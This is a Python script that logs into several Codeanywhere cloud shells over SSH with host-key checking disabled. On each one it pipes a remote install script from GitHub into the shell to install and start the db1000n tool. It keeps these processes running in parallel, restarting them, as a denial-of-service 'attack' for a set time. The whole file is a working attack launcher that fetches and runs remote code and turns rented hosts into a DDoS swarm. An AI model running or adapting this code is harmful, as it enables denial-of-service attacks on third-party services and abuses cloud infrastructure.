"""
attacks with needles via codeanywhere

"""

import argparse
import logging
import os
import shlex
import subprocess
import sys
import time

logging.getLogger().setLevel(logging.INFO)

CAW_KEYS_DIR = f'caw_keys{os.sep}'

ATTACK_COMMAND = (
    'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{user}_{host}_{port} {user}@{host} -p {port} '
    '-t "source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
    '&& ./db1000n -enable-self-update -prometheus_on=false {needles_args}"'
)


class Attack:
    """
    class to attack with needles via codeanywhere

    """

    def __init__(self):
        self.configurations = iter([])
        self.shells_num = 0
        self.processes = []

    def make_hosts(self, shells_num):
        """
        makes list of hosts

        :param shells_num: a number of ssh connections

        """
        configurations = next(os.walk(CAW_KEYS_DIR))[-1]

        if configurations:
            logging.info('codeanywhere hosts: %s', ", ".join(configurations))
            self.configurations = iter(configurations)
            self.shells_num = min(len(configurations), shells_num)
        else:
            logging.warning('there is no codeanywhere host')

    def make_process(self, needles_args):
        """
        makes process with ssh connect and runs command

        :param needles_args: db1000n arguments

        """
        configuration = next(self.configurations, None)
        if configuration:
            os.makedirs('logs', exist_ok=True)
            user, host, port = configuration.split('_')
            with open(f'logs{os.sep}codeanywhere_{configuration}.log', 'w') as log:
                process = subprocess.Popen(
                    shlex.split(ATTACK_COMMAND.format(
                        caw_keys_dir=CAW_KEYS_DIR,
                        user=user,
                        host=host,
                        port=port,
                        needles_args=needles_args
                    )),
                    stdout=log,
                    stderr=log
                )
                logging.info(
                    'codeanywhere host %s: attack started, pid %d',
                    host,
                    process.pid
                )
                self.processes.append(process)

    def start(self, needles_args):
        """
        starts attack with needles via codeanywhere

        :param needles_args: db1000n arguments

        """
        for _ in range(self.shells_num):
            self.make_process(needles_args)

        while self.processes:
            for process in self.processes:
                code = process.poll()

                if code is not None:
                    self.processes.remove(process)
                    logging.info('attack finished, pid %d, return code: %d', process.pid, code)

                if len(self.processes) < self.shells_num:
                    self.make_process(needles_args)

            time.sleep(5.)


def main():
    """
    attacks with needles via codeanywhere

    """
    parser = argparse.ArgumentParser(
        description='auto-attack with needles via codeanywhere in parallel',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--attack_time', type=int, default=1, help='minimum attack time in seconds')
    parser.add_argument('--shells_num', type=int, default=4, help='number of ssh connections')
    parser.add_argument('--needles_args', type=str, default='', help='db1000n arguments')
    args = parser.parse_args()

    attack = Attack()
    start_time = time.time()

    try:
        logging.info('press ctrl+c to stop attack')
        while (time.time() - start_time) < args.attack_time:
            attack.make_hosts(args.shells_num)
            attack.start(args.needles_args)

    except KeyboardInterrupt:
        for process in attack.processes:
            process.terminate()

        logging.info('attack interrupted')
        sys.exit()


if __name__ == '__main__':
    main()
